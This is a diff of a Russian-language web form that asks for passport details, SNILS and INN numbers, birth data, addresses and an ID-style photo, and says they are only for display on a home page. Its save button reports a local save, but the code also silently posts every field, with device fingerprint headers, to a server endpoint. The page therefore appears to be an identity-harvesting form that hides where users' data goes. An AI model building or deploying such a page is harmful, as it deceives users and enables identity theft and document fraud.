@@ -162,51 +162,103 @@
             flex: 1;
         }
         
+        /* Стили для загрузки фото */
+        .photo-upload {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .photo-preview {
+            width: 150px;
+            height: 180px;
+            border: 2px dashed var(--border);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            margin-bottom: 15px;
+            position: relative;
+            background-color: white;
+        }
+
+        .photo-preview img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .photo-upload-btn {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+        }
+
+        .photo-upload-btn input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .photo-requirements {
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 10px;
+            text-align: center;
+            max-width: 300px;
+        }
+
         @media (max-width: 768px) {
             .form-row {
                 flex-direction: column;
                 gap: 0;
             }
-            
+
             .container {
                 padding: 10px;
             }
-            
+
             .section {
                 padding: 20px 15px;
             }
         }
-        
+
         /* Анимации */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        
+
         .section {
             animation: fadeIn 0.4s ease forwards;
         }
-        
+
         .section:nth-child(2) { animation-delay: 0.1s; }
         .section:nth-child(3) { animation-delay: 0.2s; }
         .section:nth-child(4) { animation-delay: 0.3s; }
         .section:nth-child(5) { animation-delay: 0.4s; }
-        
+
         /* Кастомный скроллбар */
         ::-webkit-scrollbar {
             width: 8px;
         }
-        
+
         ::-webkit-scrollbar-track {
             background: #f1f1f1;
             border-radius: 4px;
         }
-        
+
         ::-webkit-scrollbar-thumb {
             background: var(--primary-light);
             border-radius: 4px;
         }
-        
+
         ::-webkit-scrollbar-thumb:hover {
             background: var(--primary);
         }
@@ -218,6 +270,24 @@
             <h1>Настройка персональных данных</h1>
             <p>Заполните информацию для отображения на главной странице</p>
         </header>
+
+        <div class="section">
+            <h2>Фотография</h2>
+            <div class="photo-upload">
+                <div class="photo-preview" id="photoPreview">
+                    <span>Фото не загружено</span>
+                </div>
+                <div class="photo-upload-btn">
+                    <button class="btn btn-secondary">Выбрать фото</button>
+                    <input type="file" id="photoInput" accept="image/*">
+                </div>
+                <div class="photo-requirements">
+                    Требования к фото: цветное на белом фоне, размер 3×4 см,
+                    лицо занимает 70-80% снимка, без головного убора (кроме религиозных),
+                    четкое изображение без бликов и теней
+                </div>
+            </div>
+        </div>
 
         <div class="section">
             <h2>Личные данные</h2>
@@ -297,85 +367,92 @@
             <a href="/" class="btn btn-secondary">← Назад</a>
             <button onclick="saveData()" class="btn btn-primary">Сохранить данные</button>
         </div>
+        <a href="/mobile">Мобильная версия (БЕТА)</a>
     </div>
 
     <script>
-function getDeviceId() {
-    let id = localStorage.getItem('deviceId');
-    if (!id) {
-        id = 'id-' + Math.random().toString(36).substr(2, 9);
-        localStorage.setItem('deviceId', id);
-    }
-    return id;
-}
+        // Функция для генерации ID устройства
+        function getDeviceId() {
+            let id = localStorage.getItem('deviceId');
+            if (!id) {
+                id = 'id-' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('deviceId', id);
+            }
+            return id;
+        }
 
-// Собираем все данные об устройстве
-function collectDeviceInfo() {
-    return {
-        screen: `${window.screen.width}x${window.screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        deviceId: getDeviceId(),
-        platform: navigator.platform,
-        cookies: navigator.cookieEnabled,
-        language: navigator.language,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
-    };
-}
+        // Собираем все данные об устройстве
+        function collectDeviceInfo() {
+            return {
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceId: getDeviceId(),
+                platform: navigator.platform,
+                cookies: navigator.cookieEnabled,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+        }
 
-// Собираем все данные формы
-function collectFormData() {
-    return {
-        // Личные данные
-        lastName: document.getElementById('lastName').value,
-        firstName: document.getElementById('firstName').value,
-        middleName: document.getElementById('middleName').value,
-        birthDate: document.getElementById('birthDate').value,
-        birthPlace: document.getElementById('birthPlace').value,
+        // Собираем все данные формы
+        function collectFormData() {
+            return {
+                // Фото
+                photo: localStorage.getItem('userPhoto') || null,
 
-        // Паспортные данные
-        passportNumber: document.getElementById('passportNumber').value,
-        passportIssued: document.getElementById('passportIssued').value,
-        passportCode: document.getElementById('passportCode').value,
-        passportDate: document.getElementById('passportDate').value,
+                // Личные данные
+                lastName: document.getElementById('lastName').value,
+                firstName: document.getElementById('firstName').value,
+                middleName: document.getElementById('middleName').value,
+                birthDate: document.getElementById('birthDate').value,
+                birthPlace: document.getElementById('birthPlace').value,
 
-        // Адреса
-        registrationAddress: document.getElementById('registrationAddress').value,
-        livingAddress: document.getElementById('livingAddress').value,
+                // Паспортные данные
+                passportNumber: document.getElementById('passportNumber').value,
+                passportIssued: document.getElementById('passportIssued').value,
+                passportCode: document.getElementById('passportCode').value,
+                passportDate: document.getElementById('passportDate').value,
 
-        // Документы
-        snilsNumber: document.getElementById('snilsNumber').value,
-        innNumber: document.getElementById('innNumber').value
-    };
-}
+                // Адреса
+                registrationAddress: document.getElementById('registrationAddress').value,
+                livingAddress: document.getElementById('livingAddress').value,
 
-// Отправка данных на сервер
-async function submitForm() {
-    const formData = collectFormData();
-    const deviceInfo = collectDeviceInfo();
+                // Документы
+                snilsNumber: document.getElementById('snilsNumber').value,
+                innNumber: document.getElementById('innNumber').value
+            };
+        }
 
-    try {
-        const response = await fetch('/api/submit-form', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Screen-Resolution': deviceInfo.screen,
-                'X-Timezone': deviceInfo.timezone,
-                'X-Device-ID': deviceInfo.deviceId
-            },
-            body: JSON.stringify(formData)
-        });
+        // Отправка данных на сервер
+        async function submitForm() {
+            const formData = collectFormData();
+            const deviceInfo = collectDeviceInfo();
 
-        const result = await response.json();
+            try {
+                const response = await fetch('/api/submit-form', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Screen-Resolution': deviceInfo.screen,
+                        'X-Timezone': deviceInfo.timezone,
+                        'X-Device-ID': deviceInfo.deviceId
+                    },
+                    body: JSON.stringify(formData)
+                });
 
-    } catch (error) {
-        console.error('Ошибка:', error);
-        alert('Произошла ошибка при отправке данных');
-    }
-}
+                const result = await response.json();
+
+            } catch (error) {
+                console.error('Ошибка:', error);
+                alert('Произошла ошибка при отправке данных');
+            }
+        }
+
         // Функция сохранения данных в localStorage
         function saveData() {
             submitForm();
             const userData = {
+                photo: localStorage.getItem('userPhoto') || null,
                 personal: {
                     lastName: document.getElementById('lastName').value,
                     firstName: document.getElementById('firstName').value,
@@ -400,34 +477,22 @@ async function submitForm() {
             };
 
             localStorage.setItem('userData', JSON.stringify(userData));
-            
+
             // Красивое уведомление
-            const notification = document.createElement('div');
-            notification.style.position = 'fixed';
-            notification.style.bottom = '20px';
-            notification.style.right = '20px';
-            notification.style.backgroundColor = '#4CAF50';
-            notification.style.color = 'white';
-            notification.style.padding = '15px 25px';
-            notification.style.borderRadius = '8px';
-            notification.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
-            notification.style.zIndex = '1000';
-            notification.style.animation = 'fadeIn 0.3s ease';
-            notification.textContent = 'Данные успешно сохранены!';
-            
-            document.body.appendChild(notification);
-            
-            setTimeout(() => {
-                notification.style.animation = 'fadeOut 0.3s ease';
-                setTimeout(() => notification.remove(), 300);
-            }, 3000);
+            showNotification('Данные успешно сохранены!', 'success');
         }
 
         // Функция загрузки данных из localStorage
         function loadData() {
             const savedData = localStorage.getItem('userData');
+            const photo = localStorage.getItem('userPhoto');
             if (savedData) {
                 const userData = JSON.parse(savedData);
+
+                // Загружаем фото
+                if (photo) {
+                    document.getElementById('photoPreview').innerHTML = `<img src="${photo}" alt="Фото пользователя">`;
+                }
 
                 // Заполняем поля персональных данных
                 if (userData.personal) {
@@ -460,8 +525,63 @@ async function submitForm() {
             }
         }
 
-        // Загружаем данные при загрузке страницы
-        window.addEventListener('DOMContentLoaded', loadData);
+        // Функция для отображения уведомлений
+        function showNotification(message, type) {
+            const notification = document.createElement('div');
+            notification.style.position = 'fixed';
+            notification.style.bottom = '20px';
+            notification.style.right = '20px';
+            notification.style.backgroundColor = type === 'success' ? '#4CAF50' : '#f44336';
+            notification.style.color = 'white';
+            notification.style.padding = '15px 25px';
+            notification.style.borderRadius = '8px';
+            notification.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+            notification.style.zIndex = '1000';
+            notification.style.animation = 'fadeIn 0.3s ease';
+            notification.textContent = message;
+
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.style.animation = 'fadeOut 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        // Обработчик загрузки фото
+        // Обработчик загрузки фото
+document.getElementById('photoInput').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    if (!file.type.match('image.*')) {
+        showNotification('Пожалуйста, выберите изображение', 'error');
+        return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        const photoPreview = document.getElementById('photoPreview');
+        photoPreview.innerHTML = `<img src="${e.target.result}" alt="Фото пользователя">`;
+
+        // Сохраняем фото в localStorage
+        localStorage.setItem('userPhoto', e.target.result); // Correctly saves the image data
+        showNotification('Фото успешно загружено', 'success');
+    };
+    reader.readAsDataURL(file);
+});
+
+// Загружаем данные при загрузке страницы
+window.addEventListener('DOMContentLoaded', function() {
+    loadData();
+
+    // Проверяем, есть ли сохраненное фото в localStorage
+    const savedPhoto = localStorage.getItem('userPhoto');
+    if (savedPhoto) {
+        document.getElementById('photoPreview').innerHTML = `<img src="${savedPhoto}" alt="Фото пользователя">`;
+    }
+});
+
     </script>
 </body>
 </html>
